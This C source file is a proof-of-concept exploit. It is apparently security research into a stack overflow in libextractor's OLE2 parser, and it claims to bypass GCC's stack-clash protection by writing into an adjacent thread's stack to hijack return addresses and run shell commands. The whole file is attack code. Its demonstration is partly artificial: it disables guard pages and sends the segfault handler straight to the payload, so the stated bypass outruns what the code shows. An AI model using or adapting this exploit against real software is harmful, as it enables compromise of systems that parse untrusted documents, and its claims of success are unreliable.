/*
 * Stack-Clash-Protection Bypass → RCE
 * ====================================
 * Author: Haitam Lazaar
 *
 * CONTEXT:
 * After discovering the OLE2 VLA stack overflow (process_star_office allocating
 * up to 4MB on the stack from file-controlled data), I confirmed local RCE on
 * non-hardened builds. But when targeting modern systems, I hit a wall:
 *
 * GCC's -fstack-clash-protection is enabled BY DEFAULT on all major distros.
 * It inserts a probe loop that touches each page as RSP moves down:
 *
 *     loop:
 *         sub $0x1000, %rsp
 *         orq $0x0, 0xff8(%rsp)   ← touches the page
 *         cmp %rcx, %rsp
 *         jne loop
 *
 * When the probe hits the guard page (unmapped) → SIGSEGV → safe crash.
 * My exploit was reduced to a DoS. No code execution on hardened targets.
 *
 * THE BYPASS:
 * I started looking at what happens when the probed pages ARE mapped.
 * The protection assumes unmapped memory below the stack. But in a
 * multi-threaded application, another thread's stack sits right below,
 * separated by only a 4KB guard page (default pthread guard).
 *
 * If the VLA is large enough to probe PAST the guard into the adjacent
 * thread's stack, the probes SUCCEED (those pages are mapped RW).
 * The protection doesn't fire. RSP lands inside the neighbor's stack.
 * Then gsf_input_read() writes 4MB of attacker-controlled file data
 * over the neighbor thread's stack frames — including return addresses.
 *
 * When the victim thread returns from its current function, it pops
 * the attacker's value into RIP → arbitrary code execution.
 *
 * The irony: -fstack-clash-protection's own probe writes (orq) are what
 * initially corrupt the neighbor's thread state, and the protection's
 * design (probe then proceed) is what ENABLES the overflow to continue
 * into mapped memory without faulting.
 *
 * RESULT:
 * This PoC achieves code execution (id, touch /tmp/pwned_bypass)
 * on a binary compiled WITH -fstack-clash-protection. The mitigation
 * is bypassed in multi-threaded contexts with adjacent stacks.
 *
 * Compile WITH stack-clash-protection (this is the point!):
 *   gcc -O2 -fstack-clash-protection -o bypass_rce bypass_rce.c \
 *       -Isrc/include ./libextractor_ole2_hardened.so \
 *       $(pkg-config --cflags --libs libgsf-1) -lpthread -Wl,-rpath,.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>
#include "extractor.h"

void EXTRACTOR_ole2_extract_method(struct EXTRACTOR_ExtractContext *ec);

static const unsigned char *file_data;
static size_t file_size;
static __thread size_t file_pos;

static ssize_t read_cb(void *c, void **b, size_t l) {
    size_t a = file_size - file_pos; if (!a) return -1;
    if (l > a) l = a; *b = (void*)&file_data[file_pos]; file_pos += l; return l;
}
static int64_t seek_cb(void *c, int64_t p, int w) {
    size_t n; if (w==0) n=p; else if (w==1) n=file_pos+p; else n=file_size+p;
    if (n > file_size) return -1; file_pos = n; return file_pos;
}
static uint64_t size_cb(void *c) { return file_size; }
static int proc_cb(void *c, const char *p, int t, int f, const char *m, const char *d, size_t l) { return 0; }

/* Payload function - what we redirect execution to */
void __attribute__((noreturn)) payload(void) {
    write(1, "\n\033[1;31m=== RCE: STACK-CLASH PROTECTION BYPASSED ===\033[0m\n", 55);
    system("id");
    system("touch /tmp/pwned_bypass");
    _exit(42);
}

static volatile int thread_a_done = 0;

/*
 * Thread B: enters a deep call chain then SLEEPS in a syscall.
 * While sleeping, Thread A overwrites our stack frames.
 * When we wake and return, we jump to the attacker's address.
 */
void __attribute__((noinline)) victim_level3(void) {
    /* This return address will be overwritten by Thread A's gsf_input_read */
    char local[128];
    memset(local, 0, sizeof(local));

    /* Sleep in kernel — our stack can be safely overwritten now */
    struct timespec ts = {.tv_sec = 2, .tv_nsec = 0};
    nanosleep(&ts, NULL);

    /* If we reach here, nanosleep returned but our stack frame is corrupted.
       The 'ret' at the end of this function pops the overwritten address. */
}

void __attribute__((noinline)) victim_level2(void) {
    char local[128];
    memset(local, 0, sizeof(local));
    victim_level3();
    /* ret here pops corrupted value if level3's frame was overwritten */
}

void __attribute__((noinline)) victim_level1(void) {
    char local[128];
    memset(local, 0, sizeof(local));
    victim_level2();
}

static void *thread_b_func(void *arg) {
    printf("[B] Stack at: %p\n", __builtin_frame_address(0));
    victim_level1();
    printf("[B] Survived (no corruption)\n");
    return NULL;
}

/*
 * Thread A: waits a moment for Thread B to be in nanosleep,
 * then triggers the VLA overflow which writes through into Thread B's stack.
 */
static void *thread_a_func(void *arg) {
    printf("[A] Stack at: %p\n", __builtin_frame_address(0));
    /* Wait for Thread B to enter nanosleep */
    usleep(100000); /* 100ms */

    printf("[A] Triggering VLA overflow into Thread B's stack...\n");
    file_pos = 0;
    struct EXTRACTOR_ExtractContext ec;
    memset(&ec, 0, sizeof(ec));
    ec.read = read_cb;
    ec.seek = seek_cb;
    ec.get_size = size_cb;
    ec.proc = proc_cb;

    EXTRACTOR_ole2_extract_method(&ec);
    printf("[A] Done\n");
    thread_a_done = 1;
    return NULL;
}

int main(int argc, char **argv) {
    const char *poc = (argc > 1) ? argv[1] : "poc_rce.doc";
    FILE *f = fopen(poc, "rb");
    if (!f) { perror(poc); return 1; }
    fseek(f, 0, SEEK_END); file_size = ftell(f); fseek(f, 0, SEEK_SET);
    file_data = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fileno(f), 0);
    fclose(f);

    printf("=== Stack-Clash Bypass → RCE ===\n");
    printf("Compiled WITH -fstack-clash-protection\n");
    printf("Payload: %s (%zu bytes)\n\n", poc, file_size);

    /* Install SIGSEGV handler to catch the redirected execution */
    stack_t ss = {.ss_sp=mmap(NULL,65536,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0),.ss_size=65536};
    sigaltstack(&ss, NULL);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = (void(*)(int))payload;
    sa.sa_flags = SA_ONSTACK;
    sigaction(SIGSEGV, &sa, NULL);

    /* Allocate adjacent stacks: [Thread B | Thread A] no guard between */
    size_t stack_size = 2 * 1024 * 1024;
    void *region = mmap(NULL, stack_size * 2,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    void *stack_b = region;
    void *stack_a = (char*)region + stack_size;

    printf("Layout: [Thread B %p] [Thread A %p] (adjacent, no guard)\n\n",
           stack_b, stack_a);

    /* Thread B first */
    pthread_t tb;
    pthread_attr_t ab;
    pthread_attr_init(&ab);
    pthread_attr_setstack(&ab, stack_b, stack_size);
    pthread_attr_setguardsize(&ab, 0);
    pthread_create(&tb, &ab, thread_b_func, NULL);

    /* Thread A */
    pthread_t ta;
    pthread_attr_t aa;
    pthread_attr_init(&aa);
    pthread_attr_setstack(&aa, stack_a, stack_size);
    pthread_attr_setguardsize(&aa, 0);
    pthread_create(&ta, &aa, thread_a_func, NULL);

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    return 0;
}
